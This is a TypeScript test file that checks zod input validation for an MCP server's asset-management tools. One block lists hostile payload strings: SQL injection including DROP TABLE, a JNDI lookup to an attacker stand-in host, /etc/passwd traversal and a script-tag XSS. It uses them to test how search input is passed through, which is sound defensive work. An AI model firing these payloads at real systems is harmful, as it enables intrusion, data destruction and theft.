// Zod schema validation tests — input rejection paths.
//
// These exercise the tool-level zod schemas BEFORE the handler runs.
// What we verify:
//  - Required fields are enforced
//  - Invalid UUIDs are rejected
//  - Enum values are constrained
//  - Numeric ranges (min/max) are enforced
//  - String length caps are enforced
//  - SQL-injection-shaped strings are accepted as text (escaping is server-side)
//    but length caps prevent payloads designed to overflow

import type { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { z } from 'zod'
import { AssetLabClient } from '../../src/client.js'
import { registerTools } from '../../src/tools.js'
import { apiKey, asset, paginated, single, workOrder } from '../fixtures/factories.js'
import { type FetchFake, installFetchFake } from '../fixtures/fake-fetch.js'
import { asMcpServer, FakeMcpServer } from '../fixtures/tool-harness.js'

describe('Input validation — read tools', () => {
  let server: FakeMcpServer
  let fx: FetchFake
  let client: AssetLabClient

  beforeEach(() => {
    server = new FakeMcpServer()
    fx = installFetchFake()
    client = new AssetLabClient({ apiUrl: 'https://api.example.com', apiKey: apiKey() })
    registerTools(asMcpServer(server) as McpServer, client)
  })
  afterEach(() => fx.restore())

  it('get_asset rejects non-UUID id', async () => {
    await expect(server.call('get_asset', { id: 'not-a-uuid' })).rejects.toBeInstanceOf(z.ZodError)
  })

  it('get_asset rejects missing id', async () => {
    await expect(server.call('get_asset', {})).rejects.toBeInstanceOf(z.ZodError)
  })

  it('list_assets rejects per_page > 1000 (DoS guard)', async () => {
    await expect(server.call('list_assets', { per_page: 9999 })).rejects.toBeInstanceOf(z.ZodError)
  })

  it('list_assets rejects per_page < 1', async () => {
    await expect(server.call('list_assets', { per_page: 0 })).rejects.toBeInstanceOf(z.ZodError)
  })

  it('list_assets rejects negative page number', async () => {
    await expect(server.call('list_assets', { page: -1 })).rejects.toBeInstanceOf(z.ZodError)
  })

  it('list_assets rejects search string longer than 200 chars', async () => {
    await expect(server.call('list_assets', { search: 'x'.repeat(201) })).rejects.toBeInstanceOf(
      z.ZodError
    )
  })

  it('list_sites rejects city > 100 chars', async () => {
    await expect(server.call('list_sites', { city: 'x'.repeat(101) })).rejects.toBeInstanceOf(
      z.ZodError
    )
  })

  it('list_assets rejects non-UUID site_id filter', async () => {
    await expect(server.call('list_assets', { site_id: 'not-a-uuid' })).rejects.toBeInstanceOf(
      z.ZodError
    )
  })

  it('list_assets accepts empty params (all optional)', async () => {
    fx.on('GET', '/v1/assets', () => fx.json(paginated([asset()])))
    const r = await server.call('list_assets', {})
    expect(r.isError).toBeFalsy()
  })

  it('list_assets accepts unicode search strings', async () => {
    fx.on('GET', '/v1/assets', () => fx.json(paginated([asset()])))
    const r = await server.call('list_assets', { search: '机器人 αβγ 🔧' })
    expect(r.isError).toBeFalsy()
  })
})

describe('Input validation — write tools', () => {
  let server: FakeMcpServer
  let fx: FetchFake
  let client: AssetLabClient

  beforeEach(() => {
    server = new FakeMcpServer()
    fx = installFetchFake()
    client = new AssetLabClient({ apiUrl: 'https://api.example.com', apiKey: apiKey() })
    registerTools(asMcpServer(server) as McpServer, client)
  })
  afterEach(() => fx.restore())

  it('create_asset rejects missing required name', async () => {
    await expect(server.call('create_asset', { description: 'no name' })).rejects.toBeInstanceOf(
      z.ZodError
    )
  })

  it('create_asset rejects empty-string name (min(1))', async () => {
    await expect(server.call('create_asset', { name: '' })).rejects.toBeInstanceOf(z.ZodError)
  })

  it('create_asset rejects name > 500 chars', async () => {
    await expect(server.call('create_asset', { name: 'A'.repeat(501) })).rejects.toBeInstanceOf(
      z.ZodError
    )
  })

  it('create_asset rejects invalid risk_factor enum', async () => {
    await expect(
      server.call('create_asset', { name: 'x', risk_factor: 'EXTREME' })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('create_asset rejects condition_score above 100', async () => {
    await expect(
      server.call('create_asset', { name: 'x', condition_score: 150 })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('create_asset rejects negative purchase_cost', async () => {
    await expect(
      server.call('create_asset', { name: 'x', purchase_cost: -1 })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('create_asset rejects malformed site_id UUID', async () => {
    await expect(
      server.call('create_asset', { name: 'x', site_id: 'not-a-uuid' })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('create_asset rejects malformed UUID that looks UUID-ish', async () => {
    await expect(
      server.call('create_asset', { name: 'x', site_id: 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx' })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('create_asset accepts a valid 8-4-4-4-12 UUID', async () => {
    fx.on('POST', '/v1/assets', () => fx.json(single(asset()), 201))
    const r = await server.call('create_asset', {
      name: 'x',
      site_id: '550e8400-e29b-41d4-a716-446655440000',
    })
    expect(r.isError).toBeFalsy()
  })

  it('create_work_order rejects invalid priority', async () => {
    await expect(
      server.call('create_work_order', { title: 'x', priority: 'YESTERDAY' })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('create_work_order rejects invalid status', async () => {
    await expect(
      server.call('create_work_order', { title: 'x', status: 'DONE' })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('create_work_order rejects invalid type (PM/REACTIVE only)', async () => {
    await expect(
      server.call('create_work_order', { title: 'x', type: 'CORRECTIVE' })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('create_work_order accepts valid REACTIVE type (regression for DEMAND->REACTIVE rename)', async () => {
    fx.on('POST', '/v1/work-orders', () => fx.json(single(workOrder()), 201))
    const r = await server.call('create_work_order', { title: 'x', type: 'REACTIVE' })
    expect(r.isError).toBeFalsy()
  })

  it('update_asset requires a UUID id', async () => {
    await expect(server.call('update_asset', { id: 'not-uuid', name: 'x' })).rejects.toBeInstanceOf(
      z.ZodError
    )
  })

  it('delete_asset requires a UUID id', async () => {
    await expect(server.call('delete_asset', { id: 'not-uuid' })).rejects.toBeInstanceOf(z.ZodError)
  })

  it('delete_asset rejects missing id', async () => {
    await expect(server.call('delete_asset', {})).rejects.toBeInstanceOf(z.ZodError)
  })

  it('upload_file rejects unknown bucket', async () => {
    await expect(
      server.call('upload_file', {
        bucket: 'malicious-bucket',
        file_name: 'x.pdf',
        content_base64: 'AAAA',
      })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('upload_file rejects empty content_base64', async () => {
    await expect(
      server.call('upload_file', {
        bucket: 'documents',
        file_name: 'x.pdf',
        content_base64: '',
      })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('create_upload_url rejects unknown bucket (only declared 5)', async () => {
    await expect(
      server.call('create_upload_url', {
        bucket: 'asset-images-private',
        file_name: 'x.png',
      })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('create_upload_url rejects file_name > 500 chars', async () => {
    await expect(
      server.call('create_upload_url', {
        bucket: 'documents',
        file_name: 'x'.repeat(501) + '.pdf',
      })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('bulk_create rejects more than 100 items', async () => {
    const items = Array.from({ length: 101 }, () => ({ name: 'x' }))
    await expect(server.call('bulk_create', { resource: 'assets', items })).rejects.toBeInstanceOf(
      z.ZodError
    )
  })

  it('bulk_create rejects empty items array', async () => {
    await expect(
      server.call('bulk_create', { resource: 'assets', items: [] })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('bulk_create rejects unknown resource', async () => {
    await expect(
      server.call('bulk_create', { resource: 'user-secrets', items: [{ name: 'x' }] })
    ).rejects.toBeInstanceOf(z.ZodError)
  })

  it('bulk_update rejects more than 100 items', async () => {
    const items = Array.from({ length: 101 }, (_, i) => ({
      id: `00000000-0000-0000-0000-${String(i).padStart(12, '0')}`,
      name: 'x',
    }))
    await expect(server.call('bulk_update', { resource: 'assets', items })).rejects.toBeInstanceOf(
      z.ZodError
    )
  })
})

describe('SQL-injection-shaped strings — passed through, not sanitized at MCP layer', () => {
  let server: FakeMcpServer
  let fx: FetchFake
  let client: AssetLabClient

  beforeEach(() => {
    server = new FakeMcpServer()
    fx = installFetchFake()
    client = new AssetLabClient({ apiUrl: 'https://api.example.com', apiKey: apiKey() })
    registerTools(asMcpServer(server) as McpServer, client)
  })
  afterEach(() => fx.restore())

  const payloads = [
    "'; DROP TABLE assets; --",
    "1' OR '1'='1",
    '1; SELECT pg_sleep(10);--',
    '${jndi:ldap://attacker.evil/x}',
    '\u0000',
    '\u202e\u202d', // bidi override
    '../../etc/passwd',
    '<script>alert(1)</script>',
  ]

  for (const payload of payloads) {
    it(`accepts ${JSON.stringify(payload).slice(0, 40)} as a search string — gateway is the SQL boundary`, async () => {
      let captured: unknown
      fx.on('GET', '/v1/assets', ({ url }) => {
        captured = url.searchParams.get('search')
        return fx.json(paginated([]))
      })
      const r = await server.call('list_assets', { search: payload })
      expect(r.isError).toBeFalsy()
      expect(captured).toBe(payload)
    })
  }

  it('caps search to 200 chars — prevents oversized payloads', async () => {
    await expect(server.call('list_assets', { search: 'A'.repeat(201) })).rejects.toBeInstanceOf(
      z.ZodError
    )
  })

  it('caps image_url to 2000 chars — prevents SSRF-shaped giants', async () => {
    fx.on('POST', '/v1/assets', () => fx.json(single(asset()), 201))
    await expect(
      server.call('create_asset', { name: 'x', image_url: 'https://' + 'a'.repeat(2000) })
    ).rejects.toBeInstanceOf(z.ZodError)
  })
})
